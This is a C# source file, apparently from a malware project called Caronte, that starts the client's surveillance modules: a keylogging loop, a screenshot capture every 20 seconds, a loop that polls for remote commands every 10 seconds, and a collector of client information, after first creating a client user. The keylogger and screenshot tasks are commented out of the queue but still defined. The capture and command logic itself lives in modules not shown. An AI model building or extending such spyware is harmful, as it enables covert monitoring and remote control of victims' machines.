using Caronte.Modules.CreateClientUser;
using Caronte.Modules.GetClientInformation;
using Caronte.Modules.Logger;
using Caronte.Modules.PrintScreen;
using Caronte.Modules.ReceiveCommand;
using MediatR;
using System;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;

namespace Caronte
{
    public class InitializeModules
    {
        private readonly IMediator _mediator;
        private readonly CancellationToken _cancellationToken;

        public InitializeModules(IMediator mediator, CancellationToken cancellationToken)
        {
            _mediator = mediator;
            _cancellationToken = cancellationToken;
        }

        private List<Task> CreateExecutionQueue()
        {
            var tasks = new List<Task>
            {
                //InitializeLogTask(),
                //InitializePrintScreenTask(),
                InitializeReceiveCommandTask()
            };

            return tasks;
        }

        public async Task Initialize()
        {
            await _mediator.Send(new CreateClientUserQuery());

            await Task.WhenAll(CreateExecutionQueue());
        }

        private Task InitializeLogTask()
        {
            var logTask = Task.Run(async () =>
            {
                while (!_cancellationToken.IsCancellationRequested)
                {
                    await _mediator.Send(new GetKeyboardLogQuery());
                }
            }, _cancellationToken);

            return logTask;
        }

        private Task InitializePrintScreenTask()
        {
            var printScreenTask = Task.Run(async () =>
            {
                while (!_cancellationToken.IsCancellationRequested)
                {
                    await _mediator.Send(new PrintScreenQuery());
                    await Task.Delay(TimeSpan.FromSeconds(20), _cancellationToken);
                }
            }, _cancellationToken);

            return printScreenTask;
        }

        private Task InitializeReceiveCommandTask()
        {
            var receiveCommandTask = Task.Run(async () =>
            {
                while (!_cancellationToken.IsCancellationRequested)
                {
                    await _mediator.Send(new ReceiveCommandQuery() { Seconds = 10 });
                    await Task.Delay(TimeSpan.FromSeconds(10), _cancellationToken);
                }
            }, _cancellationToken);

            return receiveCommandTask;
        }

        private Task GetClientInformation()
        {
            var getClientInformationTask = Task.Run(async () =>
            {
                while (!_cancellationToken.IsCancellationRequested)
                {
                    await _mediator.Send(new GetClientInformationQuery());
                }
            }, _cancellationToken);

            return getClientInformationTask;
        }
    }
}
